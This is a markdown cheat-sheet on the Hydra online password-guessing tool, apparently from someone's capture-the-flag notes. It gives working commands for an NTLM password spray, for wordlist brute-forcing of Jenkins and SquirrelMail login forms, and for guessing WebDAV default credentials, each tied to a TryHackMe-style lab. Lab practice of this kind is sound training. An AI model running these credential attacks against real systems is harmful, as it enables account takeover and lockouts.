# hydra

Online password-guessing tool for protocols and HTTP forms. Use carefully: it is noisy and can lock accounts.

## Commands Used

### NTLM HTTP password spray

```bash
hydra -L usernames.txt -p Changeme123 ntlmauth.za.tryhackme.com http-get '/:A=NTLM:F=401'
```

Used on: **Breaching Active Directory** - tested one OSINT password against many NTLM-authenticated domain users.

- `-L usernames.txt` - user list
- `-p Changeme123` - single password for spraying
- `A=NTLM` - tells Hydra the endpoint uses NTLM authentication
- `F=401` - treat HTTP 401 as the failure signal
### Jenkins HTTP form brute force

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  127.0.0.1 -s 8080 http-form-post \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

Used on: **Internal** - found Jenkins credentials through a local SSH port forward.

### SquirrelMail HTTP form brute force

```bash
hydra -L users.txt -P log1.txt $TARGET http-post-form \
  "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Invalid" \
  -V -f -t 4
```

Used on: **Skynet** - password candidates recovered from SMB logs were replayed against SquirrelMail to recover `milesdyson`.

## Related

- [../../techniques/creds/jenkins-http-form-bruteforce.md](../../techniques/creds/jenkins-http-form-bruteforce.md)



### WebDAV default-credential brute force

```bash
hydra -L webdav-users.txt -P webdav-users.txt 10.130.148.83 http-get /webdav
```

Used on: **bsidesgtdav** - found default-style WebDAV credentials reused for upload access.
